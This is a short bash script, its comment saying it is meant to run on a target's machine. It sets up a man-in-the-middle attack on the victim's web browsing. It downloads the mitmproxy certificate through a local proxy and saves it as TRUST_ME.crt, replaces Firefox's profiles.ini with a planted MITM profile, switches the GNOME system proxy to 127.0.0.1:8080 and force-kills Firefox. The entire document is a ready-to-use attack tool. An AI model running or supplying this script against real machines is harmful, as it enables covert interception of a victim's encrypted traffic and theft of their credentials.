#!/bin/bash

# This script installs a certificate, generates a new firefox profile, and updates the proxy settings to proxy to port 8080. Meant to be ran on a target's machine.

# generate cert
export http_proxy='127.0.0.1:8080'
wget mitm.it/cert/pem
openssl x509 -in pem -inform PEM -out ~/Downloads/TRUST_ME.crt

# put new profile in firefox
unzip profile.zip -d ~/.mozilla/firefox

# set firefox default profile
name=$(ls ~/.mozilla/firefox | grep default)
new_profile="[General]\nStartWithLastProfile=1\n\n[Profile0]\nName=MITM\nIsRelative=1\nPath=7fnh0g4k.MITM\nDefault=1\n"
printf $new_profile > ~/.mozilla/firefox/profiles.ini

gsettings set org.gnome.system.proxy mode 'manual'
gsettings set org.gnome.system.proxy.http host 127.0.0.1
gsettings set org.gnome.system.proxy.http port 8080
kill -9 $(ps -x | grep firefox)
